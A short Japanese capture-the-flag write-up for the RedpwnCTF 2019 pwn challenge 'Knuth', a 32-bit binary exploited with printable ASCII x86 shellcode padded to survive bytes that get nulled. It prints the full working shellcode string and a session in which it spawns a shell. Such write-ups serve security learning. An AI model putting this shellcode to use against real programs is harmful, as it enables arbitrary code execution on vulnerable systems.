# [pwn 413pts] Knuth - RedpwnCTF 2019
NX以外無効の32ビットバイナリです。
```
$ checksec -f knuth
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   79 Symbols     No       0               4       knuth
```
起動するとよくわからない表示が出て入力できたので、適当に入力するとIllegal Instructionで落ちました。
なのでシェルコード問かなーと思って解析するとascii shellcode問題でした。
制約付きシェルコードは面倒なだけだから嫌い。

適当にx86 ascii shellcodeを書いて送るとダメだったのでgdbで調べたところ、原理はよく分かりませんが、ところどころnullで埋められているようです。
なのでnullになっても動くような意味の無い命令を入れて、おしまいです。

完成したシェルコードはこんな感じ。
```
$ ./knuth 
[🔒] He protec
[Ω ] He TeX
!T$qPYf5p#J!T$qJJf5p!!T$qP\!T$qj0X40PPPPQPaJRX4Dj7Y0DN0RX502A05r9sOPTY01A01RX500D05cFZBPTY01SX540D05ZFXbPTYA01A01SX50A005XnRYPSX5AA005nnCXPSX5AA005plbXPTYA01Tx
But most importantly
[💸] He chec
$ whoami
ptr
$ exit
```

# 感想
何がしたかったのかも分かりませんし何でこんなに解かれてないのかも分かりません。
